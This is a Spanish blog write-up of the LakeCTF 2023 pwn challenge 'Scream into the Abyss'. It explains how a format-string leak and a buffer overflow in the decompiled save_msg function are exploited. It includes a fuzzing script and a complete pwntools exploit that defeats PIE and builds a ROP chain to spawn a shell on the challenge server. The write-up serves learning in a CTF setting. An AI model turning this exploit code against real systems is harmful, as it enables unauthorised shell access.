---
layout: post
title: Scream To The Abyss Lake CTF 2023
comments: true
categories: [Pwn, Writeups, LakeCTF]
---

Para el próximo puente tengo pensado participar en el *LakeCTF*, por tanto he decidido echar un ojo a los ejercicios del año pasado. Comenzamos con uno sencillito pero que te hará querer gritar al abismo xd.

![Image]({{ site.baseurl }}/images/posts/LakeCTFlogo.png){:width="100px"}

# Overview

El enunciado dice lo siguiente:

  Try screaming into the abyss, maybe you'll get an answer...you probably won't though :/

# Reconocimiento

Como siempre comenzamos inspeccionando el binario (*64 bits LSB*) con *checksec*:

```
  Arch:       amd64-64-little
  RELRO:      Full RELRO
  Stack:      No canary found
  NX:         NX enabled
  PIE:        PIE enabled
  SHSTK:      Enabled
  IBT:        Enabled
  Stripped:   No
```

Vemos que lo más relevante es que *no podemos ejecutar código del stack* y que tenemos el *PIE*. Vamos a descompilar con *ghidra* a ver que encontramos en el código:

```c
void main(void) {

  int input;
  uint iteration;
  
  iteration = 0;
  printf("Scream into the abyss and see how long it takes for you to get a response ;)");
  do {
    while( true ) {
      printf("Current iteration: %d\n",(ulong)iteration);
      printf("Enter input: ");
      fflush(stdout);
      input = getchar();
      getchar();
      if ((char)input != 'x') break;
      save_msg(iteration);
      iteration = 0;
    }
    iteration = iteration + 1;
  } while( true );
}

void save_msg(uint param_1){

  char input_str [264];
  char *local_10;
  
  local_10 = (char *)calloc(8,1);
  printf("You can now scream a longer message but before you do so, we\'ll take your name: ");
  fflush(stdout);
  gets(local_10);
  printf("Saved score of %d for %s. Date and Time: ",(ulong)param_1,local_10);
  fflush(stdout);
  system("date");
  printf("Now please add a message: ");
  fflush(stdout);
  gets(input_str);
  puts("Your message:");
  printf(input_str);
  puts("");
  fflush(stdout);
  return;
}
```

Vemos que si introducimos un `x`, entraremos en `save_msg`, que tiene una vulnerabilidad de tipo *BOF* y un *Format String*.

# Explotación

Con esta información podemos plantear un ataque que consista en leakear la dirección base de `main` para poder saltarnos el *PIE* y mediante *ROP* llamar a `system` con la cadena `/bin/sh\0` como argumento.

## Leakeando direcciones

Comenzaremos sacando las direcciones que hay en el stack, para ver si podemos encontrar la dirección base de `main`. Para ello, abusaremos del *Format String* mediante este script:

```python
from pwn import *

exe = './abyss_scream'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warning'

def send_payload(payload, name):
   p.recvuntil(b"input: ")
   p.sendline(b"x")
   p.recvuntil(b"name: ")
   p.sendline(name)
   p.recvuntil(b"message: ")
   p.sendline(payload)

data = b""
i = 0
name_str = "bytebl33d"
for i in range(50):
   try:
      p = start()
      send_payload(f"%{i}$p".encode(), name=name_str)
      p.recvuntil(b"Your message:\n")
      data = p.recvuntil(b"\n")
      print(i, data)
      p.recvuntil(b"input: ")
      p.close()
   except EOFError:
      pass
```



```bash
./format_fuzzer.py

4 b'0x557f3d6026b5\n'

41 b'0x561bf357a6c0\n'

43 b'0x55e4378d139e\n'

49 b'0x55c0e792931e\n'
```

Podemos inspeccionarlas con *gdb*. Pero debemos tener en cuenta que se llama a `system("date")`, lo que hace que se cree un nuevo hilo de ejecución, impidiéndonos depurar. Para ello debemos poner un *breakpoint* justo antes y saltarnos la instrucción:

```bash
b *save_msg+146     //break antes de system
b *save_msg+254     //break para inspeccionar el stack
r
jump *save_msg+154  //Nos saltamos system
```

Una vez inspeccionamos las direcciones vemos cosas útiles:

# La 41 es un puntero al principio del campo nombre
x/s 0x561bf357a6c0
0x561bf357a6c0:	"bytebl33d"

# La 43 apunta a main+128
x 0x55e4378d139e
0x55e4378d139e <main+128>:	0x00fc45c7

Vemos que tenemos una dirección donde se guarda la cadena que hemos introducido. Además, tenemos una forma de encontrar el offset de esta dirección a la dirección base de `main` mediante la segunda dirección.


## Buscando el offset

Ya sólo necesitamos encontrar el offset hasta el *RIP*. Para ello volveremos a utilizar *gdb-peda* y *cyclic*, saltándonos la llamada a *system*:

```
RSP: 0x7fffffffdc18 ("uaacvaacwaacxaacyaac")

cyclic -l uaacvaac
280
```

## Exploit

Teniendo todo en cuenta, sacamos los gadgets necesarios con *ropper* y podemos hacernos un script en *python* (créditos al final):

```python
#!/bin/python3
from pwn import *

exe = './abyss_scream'
elf = context.binary = ELF(exe, checksec=False)

def start():

    if args.REMOTE:
        return remote("chall.polygl0ts.ch", 9001)
    else:
        return process(exe)

padding = 280

def send_payload(payload, name=b"bytebl33d"):
  p.recvuntil(b"input: ")
  p.sendline(b"x")
  p.recvuntil(b"name: ")
  p.sendline(name)
  p.recvuntil(b"message: ")
  p.sendline(payload)

def get_leak_address(index, name=b"/bin/sh\x00"):
   send_payload("%{}$p".format(index), name)
   p.recvuntil(b"Your message:\n")
   data = p.recvuntil(b"\n")
   return int(data, 16)

print("main (symbols) @", context.binary.symbols["main"])
main_addr = get_leak_address(43) - 128
info(f'main_addr @ {hex(main_addr)}')

elf.address = main_addr - context.binary.symbols["main"]
info(f'PIE base @ {hex(elf.address)}')

# pop_rdi gadget
pop_rdi = elf.address + 0x13b5
info(f'pop_rdi @ {hex(pop_rdi)}')

# ret gadget
ret = elf.address + 0x101a
info(f'ret @ {hex(ret)}')

# system call address
system = elf.plt.system
info(f'system @ {hex(system)}')

# binsh address 
bin_sh = get_leak_address(41)
print("/bin/sh @", hex(bin_sh))

payload = flat({
   padding: [
      ret,
      pop_rdi,
      bin_sh,
      system
   ]
})

send_payload(payload)

p.interactive()
p.close()
```


Quiero dar crédito al [writeup original](https://bytebl33d.github.io/lake-ctf-pwn-scream-into-the-abyss/) que me ayudó a la hora de resolver el reto.